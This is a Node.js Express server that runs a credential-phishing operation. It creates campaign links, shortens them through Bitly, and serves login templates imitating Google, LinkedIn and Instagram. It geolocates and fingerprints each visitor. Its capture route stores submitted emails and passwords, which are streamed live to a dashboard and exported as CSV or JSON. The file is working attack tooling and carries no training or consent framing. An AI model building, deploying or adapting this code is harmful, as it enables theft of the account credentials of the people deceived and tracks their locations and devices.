require('dotenv').config();
const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const CAMPAIGNS_FILE = path.join(DATA_DIR, 'campaigns.json');
const BITLY_TOKEN = process.env.BITLY_TOKEN;

let sseClients = [];

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

app.set('trust proxy', true);
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

function readJSON(file) {
  try {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch { return []; }
}

function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function readCaptures() { return readJSON(CAPTURES_FILE); }
function saveCapture(data) {
  const captures = readCaptures();
  captures.push(data);
  writeJSON(CAPTURES_FILE, captures);
}

function readCampaigns() { return readJSON(CAMPAIGNS_FILE); }
function saveCampaigns(data) { writeJSON(CAMPAIGNS_FILE, data); }

async function getGeo(ip) {
  if (['::1', '127.0.0.1', 'unknown', 'localhost'].includes(ip))
    return { city: 'Local', country: 'Local', countryCode: 'XX', isp: 'Localhost', lat: 0, lon: 0 };
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=city,country,countryCode,isp,lat,lon,query`, { timeout: 3000 });
    if (res.data && res.data.city) {
      const cc = (res.data.countryCode || '').toLowerCase();
      const flag = cc ? String.fromCodePoint(...[...cc].map(c => 0x1F1E6 + c.charCodeAt(0) - 0x61)) : '🏳';
      return {
        city: res.data.city, country: res.data.country, countryCode: res.data.countryCode,
        isp: res.data.isp || 'Unknown', lat: res.data.lat, lon: res.data.lon, flag
      };
    }
  } catch {}
  return { city: 'Unknown', country: 'Unknown', countryCode: 'XX', isp: 'Unknown', lat: 0, lon: 0, flag: '🌍' };
}

function notifyClients(event, data) {
  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const client of sseClients) {
    client.write(msg);
  }
}

const TEMPLATES = {
  generic: { name: 'Generic', file: 'generic', redirect: 'https://example.com', icon: '🔐' },
  google: { name: 'Google', file: 'google', redirect: 'https://accounts.google.com', icon: '🔴' },
  linkedin: { name: 'LinkedIn', file: 'linkedin', redirect: 'https://www.linkedin.com', icon: '💼' },
  instagram: { name: 'Instagram', file: 'instagram', redirect: 'https://www.instagram.com', icon: '📷' },
};

// ── Campaign routes ──────────────────────────────────────────

app.get('/dashboard', (req, res) => {
  const captures = readCaptures();
  const campaigns = readCampaigns();
  res.render('dashboard', { captures: captures.reverse(), count: captures.length, campaigns, templates: TEMPLATES });
});

app.get('/api/captures', (req, res) => {
  let captures = readCaptures();
  const { campaign } = req.query;
  if (campaign) captures = captures.filter(c => c.campaign === campaign);
  res.json(captures.reverse());
});

app.get('/api/stats', (req, res) => {
  const captures = readCaptures();
  const total = captures.length;
  const uniqueIPs = [...new Set(captures.map(c => c.ip))].length;
  const countries = [...new Set(captures.map(c => c.country))].length;
  const byTemplate = {};
  const byCountry = {};
  const byOS = {};
  const byDevice = {};
  const timeline = [];

  captures.forEach(c => {
    byTemplate[c.template] = (byTemplate[c.template] || 0) + 1;
    byCountry[c.country] = (byCountry[c.country] || 0) + 1;
    const os = c.os.split(' ')[0] || 'Unknown';
    byOS[os] = (byOS[os] || 0) + 1;
    byDevice[c.device] = (byDevice[c.device] || 0) + 1;
    const day = c.timestamp?.split('T')[0];
    if (day) {
      const existing = timeline.find(t => t.date === day);
      if (existing) existing.count++;
      else timeline.push({ date: day, count: 1 });
    }
  });

  byCountry.entries = Object.entries(byCountry).map(([name, count]) => ({ name, count })).sort((a, b) => b.count - a.count);
  byTemplate.entries = Object.entries(byTemplate).map(([name, count]) => ({ name, count }));
  byOS.entries = Object.entries(byOS).map(([name, count]) => ({ name, count }));

  res.json({ total, uniqueIPs, countries, byTemplate, byCountry, byOS, byDevice, timeline });
});

app.get('/api/captures/export/:format', (req, res) => {
  const captures = readCaptures();
  const { format } = req.params;
  if (format === 'csv') {
    const headers = 'Timestamp,IP,City,Country,ISP,OS,Browser,Device,Campaign,Template,Email,Password,Screen,Timezone,Language,Cores,Canvas\n';
    const rows = captures.map(c =>
      `"${c.timestamp}","${c.ip}","${c.city}","${c.country}","${c.isp}","${c.os}","${c.browser}","${c.device}","${c.campaign || ''}","${c.template}","${c.email || ''}","${c.password || ''}","${c.screen || ''}","${c.timezone || ''}","${c.language || ''}","${c.cores || ''}","${c.canvas || ''}"`
    ).join('\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=captures.csv');
    res.send(headers + rows);
  } else {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=captures.json');
    res.json(captures);
  }
});

// ── Live SSE ─────────────────────────────────────────────────

app.get('/api/live', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache',
    'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*'
  });
  sseClients.push(res);
  res.write(`event: connected\ndata: ${JSON.stringify({ type: 'connected' })}\n\n`);
  req.on('close', () => { sseClients = sseClients.filter(c => c !== res); });
});

// ── Campaign management ──────────────────────────────────────

app.get('/api/campaigns', (req, res) => res.json(readCampaigns()));

app.post('/api/campaigns', (req, res) => {
  const { name, template, redirect } = req.body;
  if (!name || !template) return res.status(400).json({ error: 'Name and template required' });
  const campaigns = readCampaigns();
  const id = crypto.randomBytes(6).toString('hex');
  campaigns.push({ id, name, template, redirect: redirect || TEMPLATES[template]?.redirect || 'https://example.com', created: new Date().toISOString(), clicks: 0, captures: 0 });
  saveCampaigns(campaigns);
  res.json({ id, link: `${req.protocol}://${req.get('host')}/c/${id}` });
});

app.delete('/api/campaigns/:id', (req, res) => {
  let campaigns = readCampaigns();
  campaigns = campaigns.filter(c => c.id !== req.params.id);
  saveCampaigns(campaigns);
  res.json({ ok: true });
});

// ── Phishing capture route ───────────────────────────────────

app.get('/c/:campaign', async (req, res) => {
  const campaigns = readCampaigns();
  const campaign = campaigns.find(c => c.id === req.params.campaign);
  if (!campaign) return res.status(404).send('Not found');

  campaign.clicks = (campaign.clicks || 0) + 1;
  saveCampaigns(campaigns.map(c => c.id === campaign.id ? campaign : c));

  const parser = new UAParser(req.headers['user-agent']);
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const geo = await getGeo(ip);

  const capture = {
    ip, city: geo.city, country: geo.country, countryCode: geo.countryCode,
    flag: geo.flag, isp: geo.isp, lat: geo.lat, lon: geo.lon,
    os: `${parser.getOS().name} ${parser.getOS().version}`,
    browser: `${parser.getBrowser().name} ${parser.getBrowser().version}`,
    device: parser.getDevice().type || 'desktop',
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    referer: req.headers['referer'] || 'direct',
    campaign: campaign.id, campaignName: campaign.name,
    template: campaign.template,
    email: '', password: '',
    screen: '', timezone: '', language: '', cores: '', canvas: '', fingerprints: {}
  };

  saveCapture(capture);
  notifyClients('capture', capture);
  res.render(`templates/${campaign.template}`, { capture, campaign, redirect: campaign.redirect || TEMPLATES[campaign.template]?.redirect });
});

// ── Credential capture ───────────────────────────────────────

app.post('/c/:campaign', async (req, res) => {
  const { email, password, screen, timezone, language, cores, canvas, fingerprints } = req.body;
  const campaigns = readCampaigns();
  const campaign = campaigns.find(c => c.id === req.params.campaign);
  if (!campaign) return res.status(404).json({ error: 'Not found' });

  const parser = new UAParser(req.headers['user-agent']);
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const geo = await getGeo(ip);

  let fp = {};
  try { fp = JSON.parse(fingerprints || '{}'); } catch {}

  const capture = {
    ip, city: geo.city, country: geo.country, countryCode: geo.countryCode,
    flag: geo.flag, isp: geo.isp, lat: geo.lat, lon: geo.lon,
    os: `${parser.getOS().name} ${parser.getOS().version}`,
    browser: `${parser.getBrowser().name} ${parser.getBrowser().version}`,
    device: parser.getDevice().type || 'desktop',
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    referer: req.headers['referer'] || 'direct',
    campaign: campaign.id, campaignName: campaign.name,
    template: campaign.template,
    email: email || '', password: password || '',
    screen: screen || '', timezone: timezone || '',
    language: language || '', cores: cores || '',
    canvas: canvas || '', fingerprints: fp
  };

  saveCapture(capture);
  campaign.captures = (campaign.captures || 0) + 1;
  saveCampaigns(campaigns.map(c => c.id === campaign.id ? campaign : c));
  notifyClients('credential', capture);

  res.json({ redirect: campaign.redirect || TEMPLATES[campaign.template]?.redirect || 'https://example.com' });
});

// ── Bitly shorten ────────────────────────────────────────────

app.post('/api/shorten', async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL is required' });
  try {
    const response = await axios.post('https://api-ssl.bitly.com/v4/shorten', { long_url: url }, {
      headers: { 'Authorization': `Bearer ${BITLY_TOKEN}`, 'Content-Type': 'application/json' }
    });
    res.json({ link: response.data.link });
  } catch (err) {
    res.status(500).json({ error: 'Failed to shorten URL', details: err.response?.data || err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
